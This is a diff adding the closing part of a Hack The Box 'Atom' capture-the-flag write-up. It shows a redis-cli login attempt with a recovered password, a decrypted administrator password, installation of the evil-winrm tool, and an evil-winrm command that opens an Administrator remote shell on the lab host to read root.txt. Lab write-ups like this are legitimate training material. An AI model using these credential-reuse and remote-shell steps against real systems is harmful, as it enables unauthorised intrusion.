@@ -1,3 +1,4 @@
+[PCTF.pptx](https://github.com/AhmedMoustafa518/atom_-HTB-Writeup-/files/6834554/PCTF.pptx)
 # atom_-HTB-Writeup
 This  is my first Writeup
 
@@ -168,9 +169,74 @@ after searching about portablekanban I found that portablekanban uses a kind of 
 
 
 
+Now let's try to use it  to get the  password 
+
+>`redis-cli -h 10.10.10.237 --user administrator -a kidvscat_yes_kidvscat`
+
+
+well that's say it's wrong so it's time to decrypt it After a lot of searching it was hard to figure how to decrypt it but finally i got the right password 
+
+>`kidvscat_admin_@123` 
 
 
 
 
+Since port 22 is closed and there is no ssh to connect with we are going to use evil-winrm 
+
+
+
+![fcjnk](https://user-images.githubusercontent.com/64806211/126032826-8a878477-bf30-40b9-8b91-fe59b9146daa.jpg)
+
+
+
+
+If you're alredy install evil-winrm before u could skip this point and go for the last step 
+
+
+
+
+first we gonna type this command in terminal : 
+
+
+>`git clone https://github.com/Hackplayers/evil-winrm.git`
+
+
+
+![ins2](https://user-images.githubusercontent.com/64806211/126032871-83800c20-29e8-4f09-aa69-5a07dbb47342.png)
+
+
+
+second : 
+
+>`sudo gem install winrm winrm-fs stringio`  
+
+![ins1](https://user-images.githubusercontent.com/64806211/126032965-55a69387-84bd-46ca-858a-be63783cff37.png)
+
+
+
+
+>`SO` last thing we wanna do in this is gittin root.txt 
+
+
+
+>`cd evil-winrm && ruby evil-winrm.rb -i 10.10.10.237 -u Administrator -p kidvscat_admin_@123`      
+
+
+
+![last](https://user-images.githubusercontent.com/64806211/126033359-da977446-64ec-4c27-8f73-7ff62f912345.png)
+![lastrr](https://user-images.githubusercontent.com/64806211/126033363-d0c747a6-5b7f-4736-bf87-3799ee721565.png)
+
+
+
+finally 
+
+
+
+>`We are Legion. We do not forgive. We do not forget.`
+
+
+
+
+![lastrr](https://user-images.githubusercontent.com/64806211/126033310-b63c7821-0ed3-4db4-bf30-ad045ffdecaa.png)
 
 
